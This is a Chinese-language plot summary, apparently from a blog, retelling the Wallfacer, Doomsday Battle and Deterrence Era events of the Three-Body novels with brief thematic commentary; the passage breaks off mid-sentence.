让他们去死磕三体人，在破壁人揭穿泰勒的计谋后，来了一句神补刀。即便您成功了，主也不在乎。</p><p>&emsp;&emsp;破壁人将自己的成果发到网上，随后舆论哗然，大家接受不了泰勒杀死自己的人的计划，失落的泰勒，在罗辑别墅的周围，饮弹自尽。</p><p>&emsp;&emsp;从此人们对面壁者产生了越来越多的质疑，罗辑的好日子也到头了。世界政府秘密地将他的妻子和孩子冬眠送到未来，强迫罗辑做点什么，毕竟他是三体人唯一要暗杀的人类。苦思冥想的罗辑，走在已经被冻结的湖面上。哗啦一声，冰面裂开，罗辑掉入了湖里，在漆黑冰冷的湖水里，他终于明白当初叶文洁对他说的那番话是什么意思了。好在罗辑身体素质还行，不然差点就淹死了。 </p><p>&emsp;&emsp;悟出真想的罗辑，赶紧动用特权，把他护送到一个及其安全的地下室，在这里，罗辑通过自己的权利，向宇宙发射了一个恒星的坐标，这件事被后人戏称为，逻辑的咒语。由于咒语很久后才能生效，所以罗辑告诉医务人员，把他送去冬眠，等那颗恒星爆炸后，再唤醒他。但很快，他就在一次遭到了暗杀，这一次使用的是基因武器，针对目标进行病毒感染，现在的医疗手段对它毫无抵抗能力，罗辑立刻被医疗人员强行冬眠，希望在未来，能有医疗手段治疗他。</p><p>&emsp;&emsp;八年后，面壁者雷迪亚兹和希恩斯从冬眠中被唤醒，他们被告知，技术已经成熟到他们的预期了，脑科学家希恩斯得到超级计算机。不久之后，他和妻子造出了思想钢印，思想钢印可以在人脑中输入任何信息，并让这个人坚信不疑。比如，在受印者脑中输入水是有毒的，渐渐地他就再也不敢喝水了，这台机器的主要用途在于给人类太空军的思维打上人类必胜的信念。</p><p>&emsp;&emsp;核弹狂人雷迪亚兹得到了3.5亿吨的恒行型氢弹，紧随其后的是，他的破壁人出现，破壁人说道，你想造一百万可恒星氢弹放在水星上，主要的目的不是防御地球，而是为了引爆水星。把水星推进太阳里，从而让地球，火星，金星脱离轨道坠入太阳，与抵达的三体人同归于尽，毁灭三体人想得到的东西。这位破壁人在最后同样来了一句神补刀，你的计划，主不在乎。因为以地球的资源，根本造不出一百万颗恒星氢弹，即便造出来了，以远远不够把水星炸到脱离轨道。</p><p>&emsp;&emsp;破壁人先前也把资料上传到网上，舆论再次哗然，大家接受不了这种疯狂的举动。在之后的听证会上，雷迪亚兹的面壁者身份被终止，在准备抓捕雷迪亚兹时，他撒谎说自己的手环上是摇篮系统， 只要自己有生命危险，手环上的信号就会中断，从而引爆纽约市的氢弹，如果纽约市的氢弹被触碰也会爆炸，雷迪亚兹成功逃脱，在回国的路上，大家才知道这个摇篮系统不过是他为了脱身的幌子。</p><p>&emsp;&emsp;回国后，这位以往被国民认为是大英雄的前总统 并没有迎来鲜花和掌声，而是无数的石头，雷迪亚兹当场被无数的石头，砸死。</p><p>&emsp;&emsp;一百八十五年后，罗辑从冬眠中被叫醒，他发现周围的人充满自信，在这个时代，人们的基因渐渐进化，到处都是帅哥美女，人类掌握了两个技术，可控核聚变，这项技术的出现，彻底解决了人类的能源问题，石油能源被淘汰了。在这个时代已经没有省电省水的概念了，所有的电器都不再使用电池。另一项是，基因改造技术，彻底解决了粮食问题。</p><p>&emsp;&emsp;现在人们造出了两千艘太空战舰，飞船能达到光速的百分之十五，比三体人的飞船快多了。面壁计划很早就被废止了，罗辑当年向太空发送的咒语，被当成了笑话。为了准备与三体人作战，人们在一千米以下建立了城市，大多数人生活在地下，少部分人生活在地面上，主流语言变成了英语一汉语的杂糅语言，希望三体人占领地球的叛军组织，早在一个世纪前就被消灭了。之前人类经历的大低谷，那时候世界格局紧张异常，人人都处在备战状态，低落的情绪下，人们自暴自弃，经济开始大滑坡，环境开始恶化，全世界都发生了饥荒。人吃人成了常态，人口急剧下降，后来越来越多人逐渐想明白，既然灾难一定要来临，痛苦的一天也是一天，开心的一天也是一天，于是他们站出来引导大家，振臂高呼，给岁月以文明，而不是给文明以岁月。</p><p>&emsp;&emsp;随即人类的复兴运动兴起，文明加速进步，罗辑从冬眠中恢复了不少后，参加了最后一次面壁者远程听证会。在会上，他看到了已经苏醒的希恩斯和他的妻子助手，听证会像他们宣布了，面壁者计划被终止，所有面壁者恢复普通人的身份，希恩斯的亲子在大会上，对丈夫说道，我是你的破壁人。你所制造的思想钢印，给每个人打上的思想前面都加了负号，也就是说这些人，坚信的是人类必败，你是想培养出一批逃亡主义者，逃出地球。</p><p>&emsp;&emsp;会上的人无不惊讶，太空军开始调查这批被打上人类必败信仰的钢印族，散会后不久，这位面壁者的妻子，就切腹自尽了。而面壁者希恩斯并没有得到制裁。会后，罗辑碰上了老朋友史强，没多久，罗辑就再次遭到了暗杀，第一次差点被无人汽车撞死，第二次差点坠落身亡，第三次差点被机器人服务员捅死，第四次差点被毒死，第五次差点被只能沙发勒死，这次暗杀他的，是叫做killer的暗杀病毒，好在一向警觉敏锐的史强在他身边救了他。随后，他们为了躲避电脑追杀，离开了地下城市，去了地表。</p><p>&emsp;&emsp;另一边的增援未来的指挥官们被唤醒，由于钢印族隐藏得很深，所以这批被唤醒的军官，被任命为执行舰长，其中就包括章北海。章北海登上了自然选择号，舰长是一位漂亮的女生，名叫东方延续，他给了章北海一把手枪，说，如果发现我有失败注意的想法，可用它杀了我。结果指挥权的章北海立刻做出了让所有人都意料不到的举动，它通过各种指令，劫持自然选择号上的2000名船员，跑路了。</p><p>&emsp;&emsp;其实他一直都是一名伪装很好的失败主义者，他坚信人类必败，舰队司令部的司令们都懵了，这是什么状况？司令官们反映了半天才回过神来派出追击舰队。另一边，世界政府开始商讨如何安置即将被人类打败的三体人。与此同时，人类观测到，三体舰队派出了一个小型探测器，已经进入了太阳系。国际舰队决定，派出全部两千零十五艘恒星级战舰，拦截三体探测器，以显示地球的雄威。</p><p>&emsp;&emsp;此时地球上所有的媒体都在直播这一盛况，几乎所有人都激动地守在屏目前，有的发出兴奋的尖叫，有的感动得嚎啕大哭，无人不为自己文明而自豪，各地开始了接连不断的狂欢，舰队紧密的排成了100X20的长方形矩阵，一起去迎接。83岁的丁仪已经是这个时代最德高望重的科学家了，他被选中作为第一个接触三体小型探测器的人。先头飞船捕获了这枚探测器，这枚探测器外表像极了一滴水，它的表明光滑无比，如同明镜。于是人们给了她一个称呼，水滴。</p><p>&emsp;&emsp;谨慎的丁仪在接触水滴前，令他所在的量子号飞船，随时准备以最高速度跑路，同时临近的青铜时代号已经入了准备状态。水滴被成功捕获，这一画面传到了地球。几乎所有的人都在欢呼雀跃，热泪盈眶。丁仪博士上千仔细观看，他发现水滴的表面及其光滑，当他用显微镜看水滴表面时，他吓坏了。无论是放大一百倍，还是一千倍，一万倍，一百万倍，一千万倍。水滴的表面还是光滑无比，像镜面一样。这意味着，改物体密度极其的大，无比的坚硬，它可以轻易的横穿地球，且不会有丝毫损伤，就像子弹穿过奶酪。人们现在所能造出最光滑的东西，放大个几百倍，就可以看到粗糙的像重重山峰的纹理。惊讶无比的丁仪博士缓缓回过神来，自言自语道，毁灭你，与你何干。随后丁仪大喊一声，傻孩子们快逃啊。但一切都太晚了。</p><p>&emsp;&emsp;水滴干扰了信号，随后尾巴开始出现蓝色的光环，不断加速，捕获他的飞船瞬间汽化，随后它以全速精准地撞向，第一排第一列第一艘战舰的燃料舱。由于这些战舰用的都是核聚变燃料，燃料舱一炸就直接玩完，可见三体人对人类战舰的弱点了如指掌。它向石子划过空气一样穿过一艘又一艘战舰，整整齐齐的战舰像鞭炮一样，在太空中不断炸开了花。水滴仅仅用了1分28秒就贯穿了第一队列的一百艘战舰。由于水滴太小，人们对雷达根本检测不到，后排的舰队完全不知道怎么回事，就看见这眼前焰火表演。</p><p>&emsp;&emsp;水滴此时做出了一个不可思议的锐角急转，丝毫没有减速的撞向第二队列的飞船，后来科学家看到这段影像，都傻了。水滴的攻击方式，非常的原始，就是用头撞。当第三排战舰也炸完后，舰队开始散开准备逃跑。虽然他们不知道怎么了，但这样炸下去，不得不跑。</p><p>&emsp;&emsp;在散开的过程中虽然有战舰发现了水滴，并进行反击，但炮弹打到水滴上，丝毫没有反应。只是让他稍微减速了一下。水滴就像一枚死神的绣花针，以最短的路程，来回穿梭在战舰之间。正常战舰只有五十分钟，人类所有的骄傲与荣光。就被一枚小小的探测器，顷刻覆灭。</p><p>&emsp;&emsp;毁灭你，与你何干。这个故事可以看出，两个科技间存在巨大差距的文明，是不可能打的有来有往的。</p><p>&emsp;&emsp;这场战斗，只有两艘战舰逃离了战场，他们分别是青铜号和量子号。与他们不同方向的正在逃亡的自然选择号，以及追击它的四艘战舰。蓝色空间号，企业号，深空号，终极规律号，也幸存了下来。</p><p>&emsp;&emsp;章北海成为了这五艘战舰公认的英雄，如果他也是面壁者的话，他会是一名成功的面壁者。这无五艘战舰开始前往寻找新家园，但他们发现，最近的太阳系，以现在的速度航行，也要两千年。五艘战舰的燃料，配件，补给，只够一艘飞船达到目的地。所有人都渐渐明白这个残酷的事实，不是你死，就是我活。随着时间的推移。五艘战舰开始了彼此间的互相猜疑，都担心对方会首先发动攻击。终于，章北海下定决定要使用次声波氢弹首先发动攻击，这种攻击不会对船体造成伤害，只会消灭船内所有生命。但就当他要摁下发射键的时候，自然选择号首先遭遇了次声波氢弹袭击。在听到预警袭击的警报时，章北海放弃了发射，意味深长的说了一句，没关系，都一样。</p><p>&emsp;&emsp;瞬间，自然选择号全体船员，在次声波氢弹的袭击下，集体阵亡。发起首攻的是终极规律号战舰，他向其他的战舰也发出了次声波氢弹，但终极规律号并没有成为幸存儿，早就准备好的蓝色空间好抽干了船内的空气，没有空气，次声波就不会有任何作用。蓝色空间号随机反击，用全部武器集火终极规律号，终极规律号被彻底摧毁。随后，蓝色空间好开始打扫战场，他们拿走了所有能带的东西，飞向了远方。他们承载的人类的全部思想和记忆，怀抱着地球所有的荣光与梦想，默默地消失在永恒的夜色中。</p><p>&emsp;&emsp;再来看看地球这边，正所谓物极必反，乐极生悲。之前还手舞足蹈欢呼庆祝的人们，当亲眼看见战舰像鞭炮一样炸没时，瞬间全部崩溃，地球人开始陷入绝望，自杀的人络绎不绝。绝大多数人通过肆无忌惮的纵欲来麻痹自己。绝望充斥着这个世界。水滴飞向了太阳，并不断对太阳发出强烈的干扰信号，从此人类再也无法通过太阳作为放大天线，向宇宙发出任何信号。</p><p>&emsp;&emsp;罗辑这边，当他和史强从外面回到家时，发现成千上万的人在等他，人们都把他奉为救世主，全部跪在罗辑面前。他们说，主啊，救救我们吧。原来罗辑之前发出的咒语生效了，那颗指定的恒星被一颗光粒穿过，爆炸了。</p><p>&emsp;&emsp;现在所有人都相信罗辑是某种神，罗辑被恢复了面壁者身份，成为了地球上唯一的面壁者，同时也成为了人类唯一的信仰。现在无论他说什么，人们都会照办。罗辑立刻提了两条要求，第一、所有城市恢复秩序；第二、所有人都回家吧，让我静静。人群散尽后，逻辑给惊讶不已的史强解释了为什么咒语会生效，他提出了黑暗森林法则。</p><p>&emsp;&emsp;首先，宇宙的总量是恒定的，但宇宙中有无数的外星生命都在以指数增长。所以宇宙是一个生存死局。不是你死，就是我亡。在这种严格竞争下，一方的收益必然意味着另一方的损失，双方不存在合作的可能。也就是说，自己文明的未来，就是建立在他人文明的痛苦之上，只有损人利己才能活下去。其结果就是，一方吃掉另一方，所以每个文明都必须为了生存而战。再弱小的文明都有可能技术爆炸，从人类文明来看，我们从猿猴到现在，从宇宙的尺度，就是一瞬间的事，这就导致文明之间，随着时间推移会不断出现猜疑，大家脑子里都在想，他会不会来干掉我，抢我资源，这种不断形成的猜疑链。停止的方法，只有一方死了才会结束。所以为了避免其他文明技术爆炸，在以后跟自己争夺资源。最安全的方法就是发现一个文明后，能消灭的就直接消灭，打不过的就绕着走。</p><p>&emsp;&emsp;罗辑把宇宙比喻成一走黑暗森林，每个文明都是带枪的猎人，像幽灵一般前行在林间，每个猎人都必须小心，因为只要暴露自己的位置，就会被其他文明干掉，毕竟这是保证自己安全最好的手段。</p><p>&emsp;&emsp;我相信玩过吃鸡的人都明白这种感受，想要活下去就得干掉其他人。</p><p>&emsp;&emsp;罗辑之前的咒语，就像是在森林中的某棵树上做了标记，那么其他的猎手最安全的行为，就是悄悄毁掉那片区域。毕竟对于高级文明来说，攻击是最节省成本的。但现在罗辑再也发不出咒语了，因为水滴封锁了太阳信号。其实早在幸存舰队之间的黑暗战役传回地球后，罗辑就已经确信，黑暗森林法则是没有问题的。罗辑只让史强明白了真相，并让他保密.他现在无计可施，渐渐地，罗辑开始借酒消愁，闭门不出，像个流浪汉一样在街上游荡.后来政府机构强迫罗辑随便干点什么以增加人民的信仰，给了罗辑雪地项目。</p><p>&emsp;&emsp;这个项目是通过恒星氢弹，和海王星的油膜物质制造太空尘埃，以便在其余九个水滴到达地球前，可以提前观测到。这个计划显然是没事找事，毕竟观测的唯一作用便是，知道其余水滴什么时候到地球，罗辑无奈之下开始负责这个项目。随着工作的进展，逻辑把全部身心都投入到了雪地工程，把这当成一种逃避手段.但他越投入，人们就越失望。大家逐渐看清，罗辑的行为是在逃避，这是一个希望和失望来的一样快的时代。公众对罗辑失去了信心。很多人都开始怀疑罗辑的咒语，不过是一次巧合。罗辑从人们心中的神，变成了普通人，又变成了大骗子。他面壁者的实际权力也没有了。雪地工程也不得不停止。</p><p>&emsp;&emsp;在一个秋雨连绵的下午，罗辑被逐出自己生活多年的小区。他穿着很脏的外套，拿着铁锹，走到了最初和叶文洁对话的那片墓地。他在叶文洁墓旁开始给自己掘墓，最后精疲力尽的他，趟进坑中回想起自己的一生，他知道，是时候了。他虚弱的拿起手枪，对着空气高喊。我，要和三体人对话。随后露出了手腕上的手表，这是一个检测我生命体征的摇篮系统，只要我死了，学弟工程上的三千六百一十四颗氢弹就会爆炸，由此形成无比巨大的油膜，将会通过太阳反射出三张无比简单的突然，这三张图就是三体星球的坐标。宇宙中其他的文明将会知道你们的存在。他说，30秒后我将对自己的心脏开枪，虽然我知道三体星球暴露后，地球也会随之暴露，但我，只能这样做。</p><p>&emsp;&emsp;短短几秒，一直无处不在的智子在罗辑面前展开成三个球，上面写着，住手。三体人通过智子又说，你把枪放下，咱们好好谈。随后罗辑提出的几个条件三体人都照办了。第一、水滴飞离太阳系；第二、三体飞船离开来太阳系的轨道。</p><p>&emsp;&emsp;罗辑胜利了，他完成了面壁者的使命，他虚弱得差点晕过去，智子不断地关心罗辑的身体状况，生怕摇篮系统终止。摇篮系统是非常严谨的，如果水滴试图去触碰雪地工程上的氢弹，也会引发爆炸。他很幸运，如果不是三体人因为猜疑，消灭了人类叛军，罗辑早就死了。</p><p>&emsp;&emsp;五年后。罗辑和他的妻女来到了三体人帮地球人建造的引力波天线附近玩耍，这种天线不需要通过太阳，直接就可以像宇宙发射信号，正在玩耍的一家人，突然看见智子在他们面前展开，与他对话的是当年警告人类不要回复的监听员1379。他与逻辑相互表达敬意。临近晚霞，1379说，太阳快落下去了，你们的孩子居然不害怕。罗辑回答道，当然不害怕，她知道，明天的太阳还会升起来。</p><p>&emsp;&emsp;从叶文洁开头和罗辑的对话可以看出，这个把人类坑死的女人，在那时貌似开始有了一丝愧疚。社会中一时兴起的逃亡主义，由于只有少部分人可以逃走，所以被大部分人禁止了。在此时，人人向往的公平，反而成为了人类生存的障碍。在智子的监视下，人类变得毫无隐私，人们为了欺骗三体人，制定了面壁者计划，选出四位大骗子作为面壁者去骗三体人，其中三位面壁者都是世界知名人物，看似志在必得，信心满满，但都被一一击败，而罗辑却成为了真正的救世主。人类从绝望的大低谷时代觉醒，进入了信心满满的新时代，却又在末日之战中再次陷入了绝望，这里好像是在说，人总是好了伤疤忘了疼。从幸存的那几艘飞船之间的战斗，再到宇宙的黑暗森林法则可以看出，竞争是残酷的。宇宙是一个生死局，不是你死就是我活。从逃亡主义，到泰勒和雷迪亚兹要以杀死自己人为代价，去威慑三体人；再到罗辑怕公众知道黑暗森林法则后大家反对自己的计划所以不敢公布，这些或许想告诉我们，大多数人都是自私的，整个故事无论是叶文洁的悔悟，还是罗辑的成长，又或是人类从痛苦的反省，这些都仿佛在告诉我们，痛苦是成长的催化剂。</p><h3 id="死神永生-上"><a href="#死神永生-上" class="headerlink" title="死神永生 上"></a>死神永生 上</h3><p>&emsp;&emsp;这个故事要从一个叫云天明的人开始说起。在以前的危机纪元4年，那个时候的人们心情很复杂，外星人400年后会来侵略地球这个消息，在那会可是一个既新鲜又可怕又劲爆的消息，各个媒体都在铺天盖地的报道这件事情。不过在云天明眼里，什么三体人四百年后会侵略地球，那都不是事儿，因为以他的病情，明年的事都不用他操心了。他的身边没有几个亲戚，其中他的姐姐还总想让他早点安乐死，那时候，治疗绝症就是个花钱的无底洞，对于拖家带口还没买房子的姐姐来说，弟弟云天明早点死她还能从父亲那拿到不少遗产。云天明也很识趣，也不想受罪。想着，就这两天准备安乐死吧。</p><p>&emsp;&emsp;就在他想着安乐死的这件事儿的时候，云天明的同学胡文，带着创业成功的喜悦找到了云天明。胡文的公司主要是卖饮料的，胡文能来找云天明并不是他们之间关系有多好，而是胡文卖饮料能成功，是因为，云天明的一个点子。这个点子来自于云天明对饮料独特的爱好，这个爱好就是，在矿泉水里塞野草喝。胡文当场给了云天明三百万，这笔钱对云天明来说可有可无，云天明本想拒绝，但胡文非常坚持，无奈之下云天明才收下了这笔巨款。没多久，云天明还是决定安乐死，他的病已经重到五福享受这300万了。这笔巨款他并不打算留给姐姐，毕竟云天明已经如姐姐所愿，赶紧去阎王爷那报道了。此时，他突然灵光一闪，云天明决定用这笔钱，给他大学里暗恋的程心送一颗星星，一颗真正的星星。</p><p>&emsp;&emsp;那去哪买一颗星星呢？这是联合股展开了一项群星计划，主要的目的，是骗钱。。。对外叫筹款。他们拍卖太阳系外的部分恒星所有权，买到了，则会得到一张纸，上面标明你的合法所有权。晚上的时候你就可以望着这颗星星，心理暗爽，哈哈，这颗星星是我的了。然后就没什么乱用了。如果你想去那里，不好意思，不可能。最近的恒星都有一百多光年的距离，所以这个计划，开始时就结束了，总共也没卖出去多少颗。不过有没有用对于云天明现在来说已经不重要了，他从胡文那要到了程心得个人资料，花了三百万，匿名买了一颗恒星送给程心。不禁感叹，云天明真是个浪漫的人啊。第二天，云天明开始接受安乐死。正当他要摁下最后的确认按钮时，程心带着人突然出现。程心对他说出的第一句话非常出乎意料，天明，你知道么，安乐死法是为你通过的。 </p><p>&emsp;&emsp;这话就要从阶梯计划说起来，当时程心在情报局工作，局长叫维德，是一位雷厉风行的关键人物，他有一句广为人知的口号：前进，前进，不择手段的前进。维德想发射一枚速度达到百分之一光速的探测器，去获得三体舰队的情报，在这时，造一枚百分之一光速的探测器是不大现实的。但程心提出了一个设想，造出一枚只有辐射帆的小型探测器，并在辐射帆的航行轨道布置核弹，每一次核弹爆炸都会使飞船加速，这个过程，很像在攀登阶梯，该计划，被命名为阶梯计划。这个计划的负责人，正式程心，这枚探测器必须非常的轻，由于技术的限制，导致探测器小到只能放入一个被急冻的人脑，阶梯计划真是没有办法的办法，大家只能选择相信三体人有能力把一颗人脑还原成一个人，并且他们愿意去这么做。这种行为无异于赌博，且失败率很高，但只要成功，只要有一个人能进入三体舰队的内部，就会引起无限的可能性。程心在执行这一计划时，得知有人匿名送给了自己一颗星星，这对他来说是一个巨大的惊喜。此刻的她陷入了从未有过的幸福感。</p><p>&emsp;&emsp;阶梯计划正在紧锣密鼓的进行着。但用谁的大脑成了问题，在社会道德的压力下，这个人只能从身患绝症并且愿意安乐死的人中选，而且这个人的资历要够也愿意这么做。程心在一次和同学的聊天中，得知以前的同学云天明，身患绝症早已时日无多，程心没有多想，便把它纳入了人选之中，随后便有了程心阻止云天明安乐死的那一幕。</p><p>&emsp;&emsp;云天明得知了这来龙去脉后，接受了女神的请求，加入了阶梯计划。当云天明的大脑被取出后，程心才得知那颗星星正式云天明送的，此时她突然意识到自己做了什么。因为等待云天明的可能是无尽噩梦。假如三体人真的捕获了云天明的大脑。反复虐待也不是没有可能。阶梯计划开始了， 但百密终有一疏，探测器偏离了航线，飞向了无尽的深空。情报局的领导们选中程心冬眠，到未来继续跟进阶梯计划。希望能有奇迹发生。</p><p>&emsp;&emsp;罗辑利用黑暗森林法则拯救了地球后，人们从此进入了威慑纪元。三体人在这个年代，看似跟人类是你好我好大家好。人们感觉，三体人解除了对地球的科技封锁，并细致入微不厌其烦的传授科学。有时自己还被三体人嫌弃学得慢，被催着快点学。人们觉得，自己一下子获得了被压抑几个世纪的知识。</p><p>&emsp;&emsp;三体人还帮助人类建造了引力波天线，和引力波飞船，万有引力号。来帮助人类利用这些工具威慑自己。人们需要建造引力波发射装置，是因为用引力波向宇宙发射信息，比人类之前用的任何手段都靠谱有效。当初人类舰队被水滴团灭，在战场上，只有量子号和青铜时代号，这两艘战舰成功逃离，由于资源有限，青铜时代号突袭了量子号。带着量子号的物资飞往了另一边，经过漫长的一段时间，青铜时代号返航了，现在飞船上的人可以用肉眼看到地球了。他们激动地喊着，回家了，回家了！他们幻想着回到地球上安逸的生活，和被人崇拜的感觉。</p><p>&emsp;&emsp;之前，他们收到了一条消息，被告知，人类对三体世界的威慑，已经成功建立，让他们尽快返航。一开始没人信，后来智子在青铜时代号上展开，并建立了通信，这时青铜时代号上的人才信了。并且他们得知，自己已经成为了人们的英雄，全世界的人们都在盼望着他们回归，青铜时代号的人回到太空港后，战舰上的人，看到人山人海，都在为他们忘情的欢呼着。当青铜时代号上所有人都离舰后，突然一片寂静，迎接他们的人当中有一位上校，开口说了一番话，大致内容如下：你们已被开除了军籍，你们带来的耻辱，永远无法被抹灭，你们的亲人不想见到你们呢，他们以你们为耻，他们恨你们，你们将被移交到司法系统。</p><p>&emsp;&emsp;说完后，大批武装部队出现，逮捕了他们。罪名是一级谋杀和反人类罪。在审判中大家才知道，在当时没有退路的太空里，青铜时代号的人们建立了集权社会，为了集体生存，几乎每个人都放弃了自我，成为了集体的一部分。青铜时代号准备对另一艘战舰发起进攻时，曾有一次投票，舰上94%赞成攻击。当用次声波氢弹解决了量子号后，人们把上面的尸体全部补充进了食品库存，成了船员的食物。</p><p>&emsp;&emsp;最后审判的结果是，138人无罪，6名高级军官终身监禁，其余的人均被判刑。刑期从二十年至三百年不等。在他们进监狱前，有几位青铜时代号上的军官，被宪兵押送着最后一次进入了他们的战舰，进行一些交接工作。其中有一位被押送的军官，史耐德，他在交接完成时，突然进入另一件操作室，快速调出一个通信界面，他说道，青铜时代呼叫蓝色空间！青铜时代呼叫蓝色空间！就在此刻，一束激光穿过他们的胸膛，他用尽最后的生命喊出一句话：不要返航！这里不是家！</p><p>&emsp;&emsp;本来蓝色空间好还在犹豫中，当收到这个警报时，它立刻全功率加速，能飞多远飞多远。不久后万有引力号飞船开始追击逃跑的蓝色空间号，为什么要追呢？因为当人类得知黑暗森立法则后，特别害怕被其他外星文明发现，所以，追击蓝色空间号并将其摧毁，成为了万有引力号当前的首要任务。三体人派出了两个水滴去协助万有引力号。</p><p>&emsp;&emsp;人类文明从三体人那学到了越来越多的东西，而三体人也从人类璀璨的文化中学到了不少。当人们知道，三体人喜欢地球文化时，一开始是不相信的，后来三体人给人们看了很多，自己模仿人类文化的艺术作品，包括电影、小说、绘画等，这些作品，都是用人类作为角色，环境也都是地区上的。这时人们才相信。人们用AI和仿生技术，帮智子造了一个身体，智子成为了有躯体的机器人，摇身一变成为了一位魅力庄重的日本女人。</p><p>&emsp;&emsp;威慑纪元六十一年，程心从冬眠中被唤醒，但并不是因为阶梯计划，而是因为云天明从给他的星星。这颗恒星被发现周围还有两个行星，其中一个与地球十分相似。发现这些的是一名叫艾AA的女博士，一位像鸟儿一样轻灵的女孩子。他后来成为了程心得好友和得力助手。</p><p>&emsp;&emsp;由于现在人们已经具备了星际远航的能力，所以这个消息一出，这颗恒星的价格马上开始飞升。联合国唤醒程心就是为了买下这颗星星。程心因为这个星星开始小有名气。刚来到新世界的程心，自然是很不适应，就像是刘姥姥进大观园一样，看啥都新鲜。在这个和平盛世的年代，男性们都趋于女性化，到处都是精致的女装大佬，程心一开始走在大街上，还以为男人都灭绝了。她不禁感叹，这个时代太温柔了。</p><p>&emsp;&emsp;一天，诚信接到AA的邀请，去一个地方。程心到了后并没有找到AA，等待她的是之前自己的上司，维德冷静的向程心连开两枪，维德告诉他，我与你并没有私人恩怨，只是我需要成为执剑人，而你会阻止我。我必须不择手段的前进。</p><p>&emsp;&emsp;但AA和警察及时赶到，击断了维德的手臂，救了差点死掉的程心。还好AA及时发现了有人伪造她的声音跟程心通话。不然，诚信死定了。维德说的执剑人是什么，跟程心有用什么关系呢？在亚洲，北美，和欧洲，分布着三个引力波天线。还有一个在太空中的引力波天线，就是万有引力号飞船。执剑人掌握着启动引力波天线，向宇宙发射三体恒星坐标信号的权利。只要三体人不老实，信号就会发出去。不久后，三体世界和人类世界都会遭到黑暗森林打击。此时三体和人类这两个世界的文明都掌握在一个人的手里，这个人，就是逻辑。</p><p>&emsp;&emsp;此时的罗辑是第一任执剑人，在这个温柔的年代，人们惧怕危险的执剑人，渐渐的温柔的人们希望执剑人也是温柔的。于是民心所向，大家选择了程心作为下一任执剑人。这个时代的医疗技术已经很先进了，程心恢复得很快。不久后，程心见到了已是百岁老人的罗辑，此时的她已经白发苍苍，十分稳重而且坚定。从前的那个玩世不恭的花花公子消失了，他的妻子和孩子早已离开了他。罗辑在他人眼里变得越来越像一个恶魔，执剑人的交接仪式开始了，罗辑把控制引力波发射按钮的权杖，交给了程心， 罗辑退休了，他完成了使命。而程心万万没想到，她这个执剑人只当了15分钟，就在交接完后，潜伏在太阳系的六颗水滴，突然发动攻击，程心听着警报声不知所措，内心纠结的程心决定扔掉手中的发射控制器。</p><p>&emsp;&emsp;顷刻间，地球上三个引力波发射天线，全部被水滴撞毁。地球从此丧失了黑暗森林威慑能力。三体人一直隐藏着一项本领没有交给人类，那就是制造光速飞船的技术。三体人现在已经造出了光速飞船，四年后，新的三体舰队即将抵达地球。</p><p>&emsp;&emsp;三体人打破了两个文明间脆弱的平衡，智子给人们一年期限全部移民澳大利亚，如有不从者，格杀勿论。三体人不想灭绝人类，完全是出自于对地球文化的热爱和敬意。</p><p>&emsp;&emsp;但大多数人还沉浸在温柔乡里 ，不肯离去，等待奇迹发生。智子一看，原来你们把我说的话当耳旁风，于是没过多久，水滴开始在大城市里乱撞，高楼大厦逐个崩塌，一天内死了三十多万人。人们无奈之下开始往澳大利亚迁徙。</p><p>&emsp;&emsp;一年后，澳大利亚聚集了四十一亿六千万人，智子和水滴不可能管理这么多人，于是他们开始招募地球治安军，三体人给的待遇非常丰厚，既可获得自由，又可获得权力。一时间十亿人争相报名，最后有五百万人通过。</p><p>&emsp;&emsp;这帮治安军，开始还很收敛，但后来，随着澳大利亚的人越来越多，这帮人渐渐变成了魔鬼。随着移民期限的到来，治安军开始大量屠杀没有移民进澳大利亚的人。很多人组成了抵抗三体人的组织。这帮抵抗军的精神领袖便是罗辑。但他们并打不到三体人，因为三体人还没到。他们只能打打身为治安军的人类。</p><p>&emsp;&emsp;当移民结束后，智子切断了对澳大利亚的供给，包括食物，电力等生活必需品。智子的大意就是告诉澳大利亚的人们，你们现在开始人吃人吧。等人口降到三千万到五千万后，我们再开始供给。程心和AA也移民到了澳大利亚，她没被失望的人们打死，得多亏AA和智子的关照。</p><p>&emsp;&emsp;智子本来想带程心离开澳大利亚但被程心拒绝了，她把这个机会给了AA。程心当然知道，自己可能会在这被人吃掉，但心灰意冷的她，早就不在意了。</p><p>&emsp;&emsp;另一边正在追击蓝色空间号的万有引力号，三体人以为他们已经被跟随的水滴解决掉了。但是，万万没有想到，蓝色空间号进入了一个思维碎块，在这个空间里看三维时间的物体，就像看到了细节丰富的三维展开图。如果我在思维空间里拿走三维空间里一个人的心脏，这个被拿走心脏的人，不会有丝毫外伤，简直就是隔空取物。水滴虽然外表坚不可摧，但内部却很脆弱，人们通过四维空间，破坏了水滴的内部，随后，蓝色空间好通过思维空间进入了万有引力号，并控制了这艘飞船。不久后，蓝色空间号吸收了外有引力号上的两百多位船员。经过集体商议，他们认为三体人应该已经占领了地球，打破了和平协议。最终，大家决定，通过万有引力号，向宇宙发出三体恒星的坐标，进行打击报复。这两艘飞船履行完了对人类最后的责任，便继续向星海深处飘去。</p><p>&emsp;&emsp;万有引力号向宇宙发出三体的恒心坐标后，三体世界的恒星马上就被一颗光粒穿过，被彻底毁灭了。从此人们进入了广播纪元。</p><p>&emsp;&emsp;大移民完成后的第六天，三体恒行星被摧毁了。三体人彻底放弃了占领地球，因为他们知道，由于两个文明间长年累月的通讯，三体文明被打击后，太阳系被毁灭也只是时间问题。智子放弃了移民计划，苦难结束了。人们四处欢呼。</p><p>&emsp;&emsp;广播纪元七年，AA在澳大利亚没留多久，这些年她程心的公司打理的很好，成为了太空建筑业的巨头。那些三体人的人类治安军们开始被清算，无数的治安军被判处死刑或监禁。四年后，人们在地球上观测到了三体母星的毁灭，威胁了人类近三个世纪的三体世界，被彻底摧毁了。智子在广播纪元初消失了，偶尔也会作为三体世界的传声筒出现。为什么人类现在不去干掉智子，别忘了，水滴还在地球上呢。</p><p>&emsp;&emsp;有一天，智子突然请罗辑和程心去她家里喝茶，想和这两个老朋友叙叙旧。人们及其重视这次会谈，希望他们能带回一些有价值的信息，当所有人知道三体世界被毁灭后，智子曾代表全三体人在国际社会发表了一段简短的讲话。话语里没有谴责，没有怨恨，没有评价，只是简单通报了灾难过程。三体文明从此开始了星舰文明。</p><p>&emsp;&emsp;罗辑和程心进入了智子的家里。随后，开始了具有重要历史意义的茶道谈话。这场谈话一开始，程心就急于询问各种问题，智子给出的回答，大概就是，太阳系被摧毁是肯定的，但需要一段时间。可能有一两个世纪。当务之急，就是赶紧跑。随后，智子希望不要再被提问。她说，我请二位，是来喝茶道别的。此时，一直沉默的罗辑开口说，我可以再问一个问题么？智子请